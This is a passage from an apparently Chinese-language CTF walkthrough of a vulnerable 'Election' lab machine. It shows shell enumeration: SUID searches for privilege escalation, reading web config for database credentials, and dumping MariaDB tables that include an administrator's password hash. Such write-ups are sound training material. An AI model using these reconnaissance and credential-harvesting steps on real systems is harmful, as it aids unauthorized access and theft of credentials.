+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">love@election:~$ <span class="hljs-built_in">ls</span> -liah<br>total 100K<br>295199 drwsrwxrwx 18 love love 4.0K May 27  2020 .<br>262146 drwxr-xr-x  3 root root 4.0K Apr  9  2020 ..<br>262955 -rw-------  1 love love 1.3K Jul 15 13:47 .bash_history<br>400690 drwxrwxrwx 15 love love 4.0K Apr  8  2020 .cache<br>400783 drwxrwxrwx 14 love love 4.0K May 26  2020 .config<br>408810 drwxrwxrwx  3 love love 4.0K Oct 20  2019 .dbus<br>400951 drwxrwxrwx  2 love love 4.0K Apr  9  2020 Desktop<br>400955 drwxrwxrwx  2 love love 4.0K Apr  8  2020 Documents<br>400952 drwxrwxrwx  2 love love 4.0K Oct 20  2019 Downloads<br>400570 drwxrwxrwx  3 love love 4.0K Oct 20  2019 .gnupg<br>295196 drwxrwxrwx  2 love love 4.0K Oct 20  2019 .gvfs<br>282869 -rwxrwxrwx  1 love love 9.7K May 27  2020 .ICEauthority<br>400693 drwxrwxrwx  3 love love 4.0K Oct 20  2019 .<span class="hljs-built_in">local</span><br>262892 drwxrwxrwx  5 love love 4.0K Apr  2  2020 .mozilla<br>400956 drwxrwxrwx  2 love love 4.0K Oct 20  2019 Music<br>400957 drwxrwxrwx  2 love love 4.0K Oct 21  2019 Pictures<br>270979 -rwxrwxrwx  1 love love  807 Oct 20  2019 .profile<br>400954 drwxrwxrwx  2 love love 4.0K Oct 20  2019 Public<br>282936 -rwxrwxrwx  1 love love   66 Oct 20  2019 .selected_editor<br>283509 -rw-rw-r--  1 love love   83 May 26  2020 .Serv-U-Tray.conf<br>406263 drwxrwxrwx  2 love love 4.0K Oct 20  2019 .ssh<br>282870 -rwxrwxrwx  1 love love    0 Oct 20  2019 .sudo_as_admin_successful<br>400953 drwxrwxrwx  2 love love 4.0K Oct 20  2019 Templates<br>400958 drwxrwxrwx  2 love love 4.0K Oct 20  2019 Videos<br><br></code></pre></td></tr></table></figure>
+
+<p>对各个文件夹进行信息收集，在 Desktop 目录中发现了 <code>user.txt</code>，尝试在 <code>.mozilla</code> 看看有没有可能存储了保存的密码，很可惜并没有，借助于 gpt 可以迅速感知各个文件夹的作用，方便信息筛选。看看定时任务和 SUID 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs bash">love@election:/var/www/html/election/admin/ajax$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>      199     24 -rwsr-xr-x   1 root     root        22528 Jun 28  2019 /usr/bin/arping<br>      950     60 -rwsr-xr-x   1 root     root        59640 Mar 23  2019 /usr/bin/passwd<br>     1056     24 -rwsr-xr-x   1 root     root        22520 Mar 27  2019 /usr/bin/pkexec<br>     1443     20 -rwsr-xr-x   1 root     root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils<br>      892     40 -rwsr-xr-x   1 root     root        40344 Mar 23  2019 /usr/bin/newgrp<br>      275     44 -rwsr-xr-x   1 root     root        44528 Mar 23  2019 /usr/bin/chsh<br>      273     76 -rwsr-xr-x   1 root     root        76496 Mar 23  2019 /usr/bin/chfn<br>      530     76 -rwsr-xr-x   1 root     root        75824 Mar 23  2019 /usr/bin/gpasswd<br>     5281    148 -rwsr-xr-x   1 root     root       149080 Jan 31  2020 /usr/bin/sudo<br>     3127    376 -rwsr-xr--   1 root     dip        382696 Feb 11  2020 /usr/sbin/pppd<br>   396554   6172 -rwsr-xr-x   1 root     root      6319088 Nov 29  2017 /usr/local/Serv-U/Serv-U<br>     6947     16 -rwsr-xr-x   1 root     root        14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br>     2605     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>     6907    428 -rwsr-xr-x   1 root     root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign<br>     2304     44 -rwsr-xr--   1 root     messagebus    42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>      277     12 -rwsr-sr-x   1 root     root          10232 Dec 18  2019 /usr/lib/xorg/Xorg.wrap<br>   262203     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount<br>   262276     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping<br>   262201     28 -rwsr-xr-x   1 root     root          26696 Mar  5  2020 /bin/umount<br>   262188     44 -rwsr-xr-x   1 root     root          43088 Mar  5  2020 /bin/mount<br>   262304     44 -rwsr-xr-x   1 root     root          44664 Mar 23  2019 /bin/su<br>       66     40 -rwsr-xr-x   1 root     root          40152 Aug 23  2019 /snap/core/7917/bin/mount<br>       80     44 -rwsr-xr-x   1 root     root          44168 May  8  2014 /snap/core/7917/bin/ping<br>       81     44 -rwsr-xr-x   1 root     root          44680 May  8  2014 /snap/core/7917/bin/ping6<br>       98     40 -rwsr-xr-x   1 root     root          40128 Mar 25  2019 /snap/core/7917/bin/su<br>      116     27 -rwsr-xr-x   1 root     root          27608 Aug 23  2019 /snap/core/7917/bin/umount<br>     2657     71 -rwsr-xr-x   1 root     root          71824 Mar 25  2019 /snap/core/7917/usr/bin/chfn<br>     2659     40 -rwsr-xr-x   1 root     root          40432 Mar 25  2019 /snap/core/7917/usr/bin/chsh<br>     2735     74 -rwsr-xr-x   1 root     root          75304 Mar 25  2019 /snap/core/7917/usr/bin/gpasswd<br>     2827     39 -rwsr-xr-x   1 root     root          39904 Mar 25  2019 /snap/core/7917/usr/bin/newgrp<br>     2840     53 -rwsr-xr-x   1 root     root          54256 Mar 25  2019 /snap/core/7917/usr/bin/passwd<br>     2950    134 -rwsr-xr-x   1 root     root         136808 Jun 11  2019 /snap/core/7917/usr/bin/sudo<br>     3049     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2019 /snap/core/7917/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     3419    419 -rwsr-xr-x   1 root     root              428240 Mar  4  2019 /snap/core/7917/usr/lib/openssh/ssh-keysign<br>     6454    105 -rwsr-sr-x   1 root     root              106696 Oct  1  2019 /snap/core/7917/usr/lib/snapd/snap-confine<br>     7628    386 -rwsr-xr--   1 root     dip               394984 Jun 12  2018 /snap/core/7917/usr/sbin/pppd<br>       66     40 -rwsr-xr-x   1 root     root               40152 May 16  2019 /snap/core/7270/bin/mount<br>       80     44 -rwsr-xr-x   1 root     root               44168 May  8  2014 /snap/core/7270/bin/ping<br>       81     44 -rwsr-xr-x   1 root     root               44680 May  8  2014 /snap/core/7270/bin/ping6<br>       98     40 -rwsr-xr-x   1 root     root               40128 Mar 25  2019 /snap/core/7270/bin/su<br>      116     27 -rwsr-xr-x   1 root     root               27608 May 16  2019 /snap/core/7270/bin/umount<br>     2657     71 -rwsr-xr-x   1 root     root               71824 Mar 25  2019 /snap/core/7270/usr/bin/chfn<br>     2659     40 -rwsr-xr-x   1 root     root               40432 Mar 25  2019 /snap/core/7270/usr/bin/chsh<br>     2735     74 -rwsr-xr-x   1 root     root               75304 Mar 25  2019 /snap/core/7270/usr/bin/gpasswd<br>     2827     39 -rwsr-xr-x   1 root     root               39904 Mar 25  2019 /snap/core/7270/usr/bin/newgrp<br>     2840     53 -rwsr-xr-x   1 root     root               54256 Mar 25  2019 /snap/core/7270/usr/bin/passwd<br>     2950    134 -rwsr-xr-x   1 root     root              136808 Jun 11  2019 /snap/core/7270/usr/bin/sudo<br>     3049     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2019 /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     3419    419 -rwsr-xr-x   1 root     root              428240 Mar  4  2019 /snap/core/7270/usr/lib/openssh/ssh-keysign<br>     6452    101 -rwsr-sr-x   1 root     root              102600 Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine<br>     7622    386 -rwsr-xr--   1 root     dip               394984 Jun 12  2018 /snap/core/7270/usr/sbin/pppd<br>       55     43 -rwsr-xr-x   1 root     root               43088 Oct 16  2018 /snap/core18/1066/bin/mount<br>       64     63 -rwsr-xr-x   1 root     root               64424 Mar 10  2017 /snap/core18/1066/bin/ping<br>       80     44 -rwsr-xr-x   1 root     root               44664 Mar 23  2019 /snap/core18/1066/bin/su<br>       98     27 -rwsr-xr-x   1 root     root               26696 Oct 16  2018 /snap/core18/1066/bin/umount<br>     1720     75 -rwsr-xr-x   1 root     root               76496 Mar 23  2019 /snap/core18/1066/usr/bin/chfn<br>     1722     44 -rwsr-xr-x   1 root     root               44528 Mar 23  2019 /snap/core18/1066/usr/bin/chsh<br>     1772     75 -rwsr-xr-x   1 root     root               75824 Mar 23  2019 /snap/core18/1066/usr/bin/gpasswd<br>     1836     40 -rwsr-xr-x   1 root     root               40344 Mar 23  2019 /snap/core18/1066/usr/bin/newgrp<br>     1848     59 -rwsr-xr-x   1 root     root               59640 Mar 23  2019 /snap/core18/1066/usr/bin/passwd<br>     1939    146 -rwsr-xr-x   1 root     root              149080 Jan 18  2018 /snap/core18/1066/usr/bin/sudo<br>     2026     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 10  2019 /snap/core18/1066/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     2334    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1066/usr/lib/openssh/ssh-keysign<br>       55     43 -rwsr-xr-x   1 root     root               43088 Aug 23  2019 /snap/core18/1223/bin/mount<br>       64     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/1223/bin/ping<br>       80     44 -rwsr-xr-x   1 root     root               44664 Mar 23  2019 /snap/core18/1223/bin/su<br>       98     27 -rwsr-xr-x   1 root     root               26696 Aug 23  2019 /snap/core18/1223/bin/umount<br>     1730     75 -rwsr-xr-x   1 root     root               76496 Mar 23  2019 /snap/core18/1223/usr/bin/chfn<br>     1732     44 -rwsr-xr-x   1 root     root               44528 Mar 23  2019 /snap/core18/1223/usr/bin/chsh<br>     1782     75 -rwsr-xr-x   1 root     root               75824 Mar 23  2019 /snap/core18/1223/usr/bin/gpasswd<br>     1846     40 -rwsr-xr-x   1 root     root               40344 Mar 23  2019 /snap/core18/1223/usr/bin/newgrp<br>     1858     59 -rwsr-xr-x   1 root     root               59640 Mar 23  2019 /snap/core18/1223/usr/bin/passwd<br>     1949    146 -rwsr-xr-x   1 root     root              149080 Jan 18  2018 /snap/core18/1223/usr/bin/sudo<br>     2036     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 10  2019 /snap/core18/1223/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     2344    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1223/usr/lib/openssh/ssh-keysign<br></code></pre></td></tr></table></figure>
+
+<p>好像并没有很值得注意的地方，<code>/usr/local/Serv-U/Serv-U</code> 文件似乎有点特殊。不过 gtfobins 中没有它的利用，先看看别的吧，去找找网站目录配置文件的数据库密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">love@election:/var/www/html$ <span class="hljs-built_in">ls</span> -liah<br>total 32K<br>406326 drwxrwxrwx 3 www-data www-data 4.0K May 27  2020 .<br>406325 drwxrwxr-x 4 www-data www-data 4.0K Oct 21  2019 ..<br>394552 drwxrwxrwx 9 www-data www-data 4.0K Apr  9  2020 election<br>405623 -rwxrwxrwx 1 www-data www-data  11K Oct 20  2019 index.html<br>408195 -rwxrwxrwx 1 www-data www-data   21 Oct 20  2019 phpinfo.php<br>400981 -rwxrwxrwx 1 root     root       30 Apr  2  2020 robots.txt<br>love@election:/var/www/html$ <span class="hljs-built_in">cd</span> election<br>love@election:/var/www/html/election$ <span class="hljs-built_in">ls</span> -liah<br>total 100K<br>394552 drwxrwxrwx  9 www-data www-data 4.0K Apr  9  2020 .<br>406326 drwxrwxrwx  3 www-data www-data 4.0K May 27  2020 ..<br>405922 drwxr-xr-x 10 www-data www-data 4.0K Apr  3  2020 admin<br>395544 -rw-r--r--  1 love     love     1.9K Apr  9  2020 card.php<br>407959 drwxr-xr-x  2 www-data www-data 4.0K Apr  3  2020 data<br>407960 -rw-r--r--  1 www-data www-data 4.7K Apr  3  2020 favicon.png<br>394559 -rwxrwxrwx  1 www-data www-data   83 Apr  3  2020 .htaccess<br>407961 -rw-r--r--  1 www-data www-data  455 Apr  3  2020 index.php<br>407962 drwxr-xr-x  2 www-data www-data 4.0K Apr  3  2020 js<br>407964 drwxr-xr-x  4 www-data www-data 4.0K Apr  3  2020 languages<br>408189 drwxr-xr-x  2 www-data www-data 4.0K Apr  3  2020 lib<br>394553 -rwxrwxrwx  1 www-data www-data  35K Feb 28  2019 license.tp<br>408191 drwxr-xr-x  6 www-data www-data 4.0K Apr  3  2020 media<br>408201 -rw-r--r--  1 www-data www-data 1.1K Apr  3  2020 pemilihan.php<br>408465 drwxr-xr-x  3 www-data www-data 4.0K Apr  3  2020 themes<br>412336 -rw-r--r--  1 www-data www-data   97 Apr  3  2020 version.tp<br></code></pre></td></tr></table></figure>
+
+<p>依次查看文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">love@election:/var/www/html/election$ <span class="hljs-built_in">cat</span> version.tp<br>&#123;<br>        <span class="hljs-string">&quot;codename&quot;</span>: <span class="hljs-string">&quot;Arctic Fox&quot;</span>,<br>        <span class="hljs-string">&quot;major&quot;</span>: 2,<br>        <span class="hljs-string">&quot;minor&quot;</span>: 0,<br>        <span class="hljs-string">&quot;released_date&quot;</span>: <span class="hljs-string">&quot;2019-03-06 00:00:00&quot;</span><br>&#125;<br>love@election:/var/www/html/election$ <span class="hljs-built_in">cat</span> card.php<br>00110000 00110001 00110001 00110001 00110000 00110001 00110000 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110001 00110001 00110000 00110000 00110001 00110000 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110001 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110000 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110001 00110000 00110000 00100000 00110000 00110000 00110000 00110000 00110001 00110000 00110001 00110000 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110000 00110000 00100000 00110000 00110001 00110001 00110000 00110000 00110000 00110000 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110001 00110001 00110000 00110001 00110000 00100000 00110000 00110001 00110000 00110001 00110001 00110000 00110001 00110000 00100000 00110000 00110001 00110001 00110001 00110001 00110000 00110000 00110000 00100000 00110000 00110001 00110001 00110000 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110000 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110000 00110000 00110000 00110000 00110001 00100000 00110000 00110001 00110000 00110000 00110000 00110000 00110000 00110000 00100000 00110000 00110000 00110001 00110000 00110000 00110000 00110001 00110001<br>love@election:/var/www/html/election$ <span class="hljs-built_in">cat</span> .htaccess<br>Options -Indexes<br>RewriteEngine on<br>RewriteRule ^admin/logs/system.log admin/logs.php<br>love@election:/var/www/html/election$ <span class="hljs-built_in">cat</span> index.php<br>&lt;?php<br>  <span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-string">&quot;./admin/inc/conn.php&quot;</span>))&#123;<br>    header(<span class="hljs-string">&quot;Location: ./install/?_rdr&quot;</span>);<br>    <span class="hljs-built_in">exit</span>();<br>  &#125;<br>  require <span class="hljs-string">&quot;./lib/homeAPI.php&quot;</span>;<br><br>  <span class="hljs-variable">$home</span> = new homeAPI();<br>  <span class="hljs-variable">$localize</span> = <span class="hljs-variable">$home</span> -&gt; localize();<br><br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$home</span> -&gt; isRegistered())&#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$localize</span>[alert_redirecting]&lt;script&gt;setTimeout(function()&#123;top.location=&#x27;./pemilihan.php?_loggedin&#x27;;&#125;,1000)&lt;/script&gt;&quot;</span>;<br>    <span class="hljs-built_in">exit</span>();<br>  &#125;<br>  <br>  include <span class="hljs-variable">$home</span> -&gt; getThemeFile(<span class="hljs-string">&quot;home.php&quot;</span>);<br><br>  <span class="hljs-variable">$home</span> -&gt; db_disconnect();<br>?&gt;<br><br></code></pre></td></tr></table></figure>
+
+<p>index.php 文件中提到了一个文件 <code>./admin/inc/conn.php</code>，根据名字猜测应该是数据库连接配置文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">love@election:/var/www/html/election$ <span class="hljs-built_in">cat</span> pemilihan.php<br>&lt;?php<br>  <span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-string">&quot;./admin/inc/conn.php&quot;</span>))&#123;<br>    header(<span class="hljs-string">&quot;Location: ./install/?_rdr&quot;</span>);<br>    <span class="hljs-built_in">exit</span>();<br>  &#125;<br>  require <span class="hljs-string">&quot;./lib/homeAPI.php&quot;</span>;<br><br>  <span class="hljs-variable">$election</span> = new homeAPI();<br>  <span class="hljs-variable">$localize</span> = <span class="hljs-variable">$election</span> -&gt; localize();<br><br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$election</span> -&gt; isRegistered() == <span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$localize</span>[alert_acces_denied]&lt;script&gt;setTimeout(function()&#123;top.location=&#x27;./?_nosession&#x27;;&#125;,1000)&lt;/script&gt;&quot;</span>;<br>    <span class="hljs-built_in">exit</span>();<br>  &#125;<br>  <br>  <span class="hljs-variable">$timeNow</span> = strtotime(<span class="hljs-variable">$election</span> -&gt; getCurrentTimestamp());<br>  <span class="hljs-variable">$timeExp</span> = strtotime(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;os_pemilih_kadaluarsa&#x27;</span>]);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$timeNow</span> &gt; <span class="hljs-variable">$timeExp</span>)&#123;<br>    <span class="hljs-built_in">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;os_pemilih&#x27;</span>],<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;os_pemilih_kadaluarsa&#x27;</span>],<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;os_pemilih_panitia&#x27;</span>]);<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$localize</span>[alert_session_expired]&lt;script&gt;setTimeout(function()&#123;top.location=&#x27;./?_nosession&#x27;;&#125;,1000)&lt;/script&gt;&quot;</span>;<br>    <span class="hljs-built_in">exit</span>();<br>  &#125;<br>  <span class="hljs-variable">$countdown</span> = <span class="hljs-string">&quot;&lt;span id=\&quot;waktu\&quot; data-kadaluarsa=\&quot;<span class="hljs-variable">$_SESSION</span>[os_pemilih_kadaluarsa]\&quot; data-multivote=\&quot;&quot;</span>.<span class="hljs-variable">$election</span> -&gt; getSettings(<span class="hljs-string">&quot;multivote&quot;</span>).<span class="hljs-string">&quot;\&quot;&gt;<span class="hljs-variable">$localize</span>[text_loading]&lt;/span&gt;&quot;</span>;<br><br>  include <span class="hljs-variable">$election</span> -&gt; getThemeFile(<span class="hljs-string">&quot;election.php&quot;</span>);<br><br>  <span class="hljs-variable">$election</span> -&gt; db_disconnect();<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>的确有数据库用户名和密码，尝试进入数据库看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs bash">love@election:/var/www/html/election/admin/inc$ mysql -unewuser -p<br>Enter password: <br>Welcome to the MariaDB monitor.  Commands end with ; or \g.<br>Your MariaDB connection <span class="hljs-built_in">id</span> is 7874<br>Server version: 10.1.44-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04<br><br>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>MariaDB [(none)]&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| election           |<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>+--------------------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>MariaDB [(none)]&gt; use election<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>MariaDB [election]&gt; show tables;<br>+--------------------+<br>| Tables_in_election |<br>+--------------------+<br>| tb_guru            |<br>| tb_hakpilih        |<br>| tb_kandidat        |<br>| tb_level           |<br>| tb_panitia         |<br>| tb_pengaturan      |<br>| tb_polling         |<br>| tb_siswa           |<br>+--------------------+<br>8 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>MariaDB [election]&gt; <span class="hljs-keyword">select</span> * from tb_guru;<br>Empty <span class="hljs-built_in">set</span> (0.00 sec)<br><br>MariaDB [election]&gt; <span class="hljs-keyword">select</span> * from tb_hakpilih;<br>Empty <span class="hljs-built_in">set</span> (0.00 sec)<br><br>MariaDB [election]&gt; <span class="hljs-keyword">select</span> * from tb_kandidat;<br>+----+------+-------+--------+------+<br>| <span class="hljs-built_in">id</span> | nama | kelas | bio    | fbid |<br>+----+------+-------+--------+------+<br>| 76 | Love | 1     | admin1 |      |<br>+----+------+-------+--------+------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>MariaDB [election]&gt; <span class="hljs-keyword">select</span> * from tb_level;<br>+----+---------------+<br>| <span class="hljs-built_in">id</span> | level         |<br>+----+---------------+<br>|  1 | Administrator |<br>|  2 | Registrator   |<br>|  3 | Inspector     |<br>+----+---------------+<br>3 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>MariaDB [election]&gt; <span class="hljs-keyword">select</span> * from tb_panitia;<br>+----+----------+------+-------+----------------------------------+<br>| <span class="hljs-built_in">id</span> | no_induk | nama | level | password                         |<br>+----+----------+------+-------+----------------------------------+<br>|  1 | 1234     | Love |     1 | bb113886b0513a9d882e3caa5cd73314 |<br>+----+----------+------+-------+----------------------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>MariaDB [election]&gt; <span class="hljs-keyword">select</span> * from tb_pengaturan;<br>+----+----------+---------------------------+------------------+--------+-----------+----------+-------------+------------------+---------------------+----------+------------------+---------+---------+---------+<br>| <span class="hljs-built_in">id</span> | judul    | subjudul                  | instansi         | themes | multivote | nullvote | enable_poll | election_timeout | disabled_text       | timezone | default_language | logging | v_major | v_minor |<br>+----+----------+---------------------------+------------------+--------+-----------+----------+-------------+------------------+---------------------+----------+------------------+---------+---------+---------+<br>|  1 | eLection | Web Based Election System | Tripath Projects | shards |         1 |        0 |           1 | 5 